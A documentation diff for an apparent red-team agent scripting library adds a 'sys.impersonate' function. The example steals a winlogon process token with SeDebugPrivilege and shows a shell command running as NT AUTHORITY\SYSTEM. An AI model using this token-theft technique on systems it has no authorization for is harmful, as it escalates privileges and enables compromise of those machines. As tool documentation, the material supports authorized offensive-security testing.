@@ -1601,6 +1601,35 @@ For users, will return name and groups of user.
 
 The **sys.hostname** method returns a String containing the host's hostname.
 
+### sys.impersonate
+
+`sys.impersonate(pid: int) -> int`
+
+The **sys.impersonate** method steals a token from a target process by PID and impersonates it. Returns a token store ID and automatically activates the token.
+
+Requires `SeDebugPrivilege` to open other users' process tokens.
+
+```python
+# find SYSTEM process PID (ex. winlogon)
+for p in process.list():
+    if 'winlogon' in p['name'].lower():
+        print(p['pid'], p['name'])
+...
+676 winlogon.exe
+...
+
+# check if the current process has SeDebugPrivilege
+$> "SeDebugPrivilege=enabled" in sys.tokens(process.info()['pid'])[0]['privileges']
+True
+
+$> t1 = sys.impersonate(676)
+
+$> sys.shell('whoami')
+nt authority\system
+
+$> sys.use_token(0) # revert to self
+```
+
 ### sys.is_bsd
 
 `sys.is_bsd() -> bool`
